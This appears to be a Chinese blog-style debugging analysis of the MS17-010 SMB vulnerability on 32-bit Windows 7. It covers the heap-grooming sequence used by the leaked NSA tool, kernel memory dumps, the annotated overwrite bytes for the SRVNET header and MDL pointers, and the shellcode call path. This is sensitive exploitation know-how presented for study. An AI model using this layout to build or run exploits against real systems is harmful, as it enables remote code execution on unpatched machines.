
# ms17-010 漏洞分析

## 0x00 前言

近期重新分析了ms17-010漏洞，想写一个自己的工具，在重新分析的过程中，其实又发现了很多之前没有进行深究的问题，由于很多东西还没有弄明白，先记录一下自己的分析过程以及踩的坑，不由感慨漏洞分析和想要实际利用两者之间的差距确实挺大的。

环境：

win7 sp1 32bits `srv.sys` 6.1.7601.17514

## 0x05 漏洞的内存布局实现

```
85774000 00011000 00000000 00000000 00000000
85774010 8b6f0008 871b5e60 871b5e60 85774160
85774020 00010ea0 00000080 8577403c 00000000
85774030 0000fff7 85774010 857740a4 00000000
85774040 10040060 00000000 85774160 85774000
85774050 00010ea0 00000160 0003fd74 0003fd75
85774060 0003fd76 0003fd77 0003fd78 0003fd79
85774070 0003fd7a 0003fd7b 0003fd7c 0003fd7d
85774080 0003fd7e 0003fd7f 0003fd80 0003fd81
85774090 0003fd82 0003fd83 0003fd84 48be015c
857740a0 7447dbac 00000000 00000064 00020004
857740b0 00020000 00000000 00010ea0 00000fff
857740c0 00000000 00000000 00000000 00000000
857740d0 8b701820 005c003a 00650044 00690076
857740e0 00650063 0048005c 00720061 00640064
857740f0 00730069 0056006b 006c006f 006d0075
85774100 00310065 0050005c 006f0072 00720067
85774110 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
85774120 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
85774130 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
```

越界后：

```
85774000 00000000 00000000 0000ffff 00000000
85774010 0000ffff 00000000 00000000 00000000
85774020 00000000 00000000 ffdff100 00000000
85774030 00000000 ffdff020 ffdff100 ffffffff
85774040 10040060 00000000 ffdfef80 00000000
85774050 ffd00010 ffffffff ffd00118 ffffffff
85774060 00000000 00000000 00000000 00000000
85774070 10040060 00000000 00000000 00000000
85774080 ffcfff90 ffffffff 00000000 00000000
85774090 00001080 00000000 00000000 00000000
857740a0 7447db76 00000000 00000064 00020004
857740b0 00020000 00000000 00010ea0 00000fff
857740c0 00000000 00000000 00000000 00000000
857740d0 8b701820 005c003a 00650044 00690076
857740e0 00650063 0048005c 00720061 00640064
857740f0 00730069 0056006b 006c006f 006d0075
85774100 00310065 0050005c 006f0072 00720067
85774110 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
85774120 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
85774130 4e4e4e4e 4e4e4e4e 4e4e4e4e 4e4e4e4e
```

精准覆盖的`SRVNET\_HEADER`部分字段含义如下：

```c++
chunk 80 00 a8 00 00 00 00 00 00 00 00 00
0x00 00 00 00 00 00 00 00 00 ff ff 00 00 00 00 00 00
0x10 ff ff 00 00 # 用来让srvnet!SrvNetFreeBuffer函数真的释放空间，防止被直接置0重复使用
0x14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x24 00 00 00 00
0x28 00 f1 df ff 00 00 00 00 00 00 00 00
0x34 20 f0 df ff # shellcode触发链指针
0x38 00 f1 df ff # \_
0x3c 00 00 00 00 # MDL.next
0x40 60 00 # MDL.size
0x42 04 10 # MDL.MdlFlags
0x44 00 00 00 00 # MDL.\*Process
0x48 80 ef df ff # MDL.MappedSystemVa x86\_addr-0x80
0x4c 00 00 00 00 # \_ 这里后续本来应该是StartVa,ByteCount,ByteOffset
0x50 10 00 d0 ff ff ff ff ff # x64 MDL
0x58 10 01 d0 ff ff ff ff ff # x64 pmdl2
0x60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x70 60 00 # MDL.size
0x72 04 10 # MDL.MdlFlags
0x74 00 00 00 00 00 00 00 00 00 00 00 00
0x80 90 ff cf ff ff ff ff ff # x64\_addr-0x80
```

其中需要关注的是偏移`0x34`处的指针，该指针正常情况下最终指向的是`srv!SrvReceiveHandler`，用于处理会话结束后的情况。指针调用的逻辑如下：

```asm
// srvnet!SrvNetWskReceiveComplete+13
mov edi, [esi+24h]
// srvnet!SrvNetIndicateData+17
mov ebx, dword ptr [ebp+8]
// srvnet!SrvNetCommonReceiveHandler+13
mov esi, dword ptr [ebp+8]
// srvnet!SrvNetCommonReceiveHandler+64
mov eax, dword ptr [esi+16Ch]
// srvnet!SrvNetCommonReceiveHandler+0x91
call dword ptr [eax+4] // 该处为shellcode执行的地方
```

感兴趣的可以下断点观察：

```
kd> ba e1 ffdff1f1
kd> bu srvnet!SrvNetWskReceiveComplete+17"r $t0=poi(esi+24h);r $t1=poi(@$t0+16c);.if(@$t1 !=0x00000000){.printf \"srvnet!SrvNetWskReceiveComplete+17 addr: %p val:%p val+16c:%p \*(val+16c):%p func:%p\\n\",esi+24h,@$t0,@$t0+16c,@$t1,poi(@$t1+0x4);gc;} .else {gc;}"
```

- 基础知识

`SMB\_COM\_SESSION\_SETUP\_ANDX`消息是SMB中用来以ntml协议验证的命令，但是对于<a href="elink@9c3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3!0H3k6h3&6K6M7r3g2U0M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4y4h3k6H3M7X3!0@1L8$3y4G2L8s2y4Q4x3V1k6E0M7#2)9J5k6r3y4A6k6Y4y4Q4x3V1j5^5x3h3f1I4y4h3c8W2k6g2)9J5k6o6S2X3j5U0k6Q4x3X3b7@1x3e0l9J5i4K6u0V1z5o6j5@1y4q4)9J5k6o6N6W2j5h3p5%4k6r3g2V1y4U0y4X3y4#2)9K6c8Y4u0W2k6r3W2J5k6h3y4@1k6h3c8X3M7X3!0E0i4K6y4p5e0g2y4p5e0R3`.`.">ntml v1</a> 和 <a href="elink@83dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3!0H3k6h3&6K6M7r3g2U0M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4y4h3k6H3M7X3!0@1L8$3y4G2L8s2y4Q4x3V1k6E0M7#2)9J5k6s2y4E0j5W2)9J5c8X3p5H3x3r3b7H3x3K6j5I4i4K6u0V1x3K6f1@1y4q4)9J5k6o6b7^5y4o6g2Q4x3X3b7&6y4X3q4T1i4K6u0V1x3K6l9&6j5U0c8T1j5U0M7%4x3o6g2V1">ntml v2</a>却有两个不同的请求结构体，而其中两个`WordCount`的值是不一样的。

![图片描述](upload/attach/202207/859191\_9VYFY2HTPGYKDDH.png)

在`BlockingSessionSetupAndX`函数中，由于逻辑判断的错误，我们可以发送`Extended Security request(12)`附带`CAP\_EXTENDED\_SECURITY`，但不附带`FLAG2\_EXTENDED\_SECURITY`，将请求伪装成`SMB\_COM\_SESSION\_SETUP\_ANDX(13)`。函数伪代码如下：

```C++
BlockingSessionSetupAndX(request, smbHeader)
{
// check word count
if (! (request->WordCount == 13 || (request->WordCount == 12 && (request->Capablilities & CAP\_EXTENDED\_SECURITY))) ) {
// error and return
}
// ...
if ((request->Capablilities & CAP\_EXTENDED\_SECURITY) && (smbHeader->Flags2 & FLAGS2\_EXTENDED\_SECURITY)) {
// this request is Extend Security request
GetExtendSecurityParameters(request); // extract parameters and data to variables
SrvValidateSecurityBuffer(request); // do authentication
}
else {
// this request is NT Security request
GetNtSecurityParameters(request,&smbInformationLength); // extract parameters and data to variables
SrvValidateUser(request); // do authentication
}
// ...
length = isUnicode ? smbInformationLength :smbInformationLength\*sizeof( WCHAR );
infoBuffer = ALLOCATE\_NONPAGED\_POOL(length,BlockTypeDataBuffer);
}
```

从伪代码中可以看出，这样我们会调用`GetNtSecurityParameters`函数，这个函数在`Extended Security request(12)`被当作`SMB\_COM\_SESSION\_SETUP\_ANDX(13)`请求解析时，会将`SecurityBlob`解析为`ByteCount`的大小，并在接下来根据是否是unicode字符串来分配空间。这样就可以创造处大小可控的非分页内存空间。

![图片描述](upload/attach/202207/859191\_DTRNW3UUD9JN5GT.png)

- 调试过程

首先，NSA工具集会使用匿名验证获取TID, PID, UID, MID以及系统版本信息，然后通过发送`Trans2`命令，判断是否已经存在NSA后门。

![图片描述](upload/attach/202207/859191\_DJQBBDP8RJPX4A5.png)

然后利用`Trans2`的漏洞先发送除了最后一帧外的所有数据包，这样由于最后一帧没有发送，就不会触发`fealist`计算`Ntfealist`的过程，不会对`Ntfealist`的空间进行申请。

![图片描述](upload/attach/202207/859191\_JN9663H54SJ2F6E.png)

然后，利用`SMB\_COM\_SESSION\_SETUP\_ANDX`的漏洞，构造一个稍大的内存空间，该空间主要是用来容纳需要被覆盖的那几个`srvnet`结构的，这里我们叫它`Buff1`。

![图片描述](upload/attach/202207/859191\_BNDG7CK42E4PQF5.png)

紧接着，申请了一堆`srvnet`的连接，这样的申请会将非分页内存空间中大小与`srvnet`空间大小相近的空闲空间全部占满，这样在后面再次申请空间时，就会将大块空间进行拆分，然后再次分配出去。

![图片描述](upload/attach/202207/859191\_BRNJHDJEQE4GF6S.png)

然后又创建了一块大空间`Buff2`，这块空间的大小与转化后的`Ntfealist`空间大小相似，由于`Buff1`和`Buff2`的空间都属于较大的，在分页内存空间中分配大概率会前后紧挨着，分页内存在分配时又会从低地址向高地址进行分配，此时的空间布局应该是`Buff2`+`Buff1`。

![图片描述](upload/attach/202207/859191\_HUHSTBW5P3KH7RG.png)

紧接着，NSA工具将`Buff1`的空间进行释放，同时又申请了5块`srvnet`空间，5块`srvnet`空间大小刚好和`Buff1`的空间大小接近，而前面`srvnet`空间大小的非分页内存又被之前申请的`srvnet`连接占满，所以这5块`SrvnetBuff`将会被系统拆分`Buff1`后分配。所以此时内存布局改变为`Buff2`+`SrvnetBuff`\*5。

![图片描述](upload/attach/202207/859191\_6UDK7SXKWWMDHFV.png)

关键点来了，再又一次的网络连接判断后，NSA工具释放了`Buff2`的内存空间，并且发送最后一帧`Trans2`数据，触发了溢出漏洞，这样申请到的`Ntfealist`的空间大概率就是`Buff2`。此时的内存布局就变成了`Ntfealist`+`SrvnetBuff`\*5，这样溢出后必定会覆盖5个`SrvnetBuff`中的一个。

![图片描述](upload/attach/202207/859191\_KTXRMRESR4UUBVA.png)

覆盖后，由于`Srvnetbuff`的头部我们修改了`PMDL`结构体指针，所以再次发送数据，内容将会放到我们指定的内存空间`0xffdff000`处，这个内存是块可执行的空间。

![图片描述](upload/attach/202207/859191\_NPAD8JWEWB5TPS8.png)

最终通过我们预先改变的`DisconnectHandleFunc`指针链，我们会在`srvnet!SrvNetCommonReceiveHandler+0x91`处调用传入的shellcode，shellcode的地址为`0xffdff1f1`。

![图片描述](upload/attach/202207/859191\_HA7PC9DBF6FF9X7.png)

## 0x06 小结

虽然还是比较努力的分析了，但越分析越发现自己依旧有很多不明白的地方，记录下目前还遗留的坑点。

1. shellcode做了些什么？怎么样实现的后门驻留？

2. `pMdl`和实际读写地址的关系，实际写入shellcode的地方实在`tcpip`的驱动中，覆盖的`pMdl`指针并没有直接指向`0xffdff000`的部分，那么这个偏移计算的利用关系是怎么样的？

3. Doublepulsar如何实现的，到底做了些什么事情？

在分析过程中，我发现这个漏洞的利用其实很难在流量层进行检测，堆布局的手法可以改变，同时覆盖的指针结构数据也可以改变，非分页内存中可执行的地址也可以改变，Shellcode的具体大小没有限制，在IDS层进行的检测基本都能绕过，确实是个相当好的组合漏洞，对当年就能写这种工具的大佬佩服地五体投地。
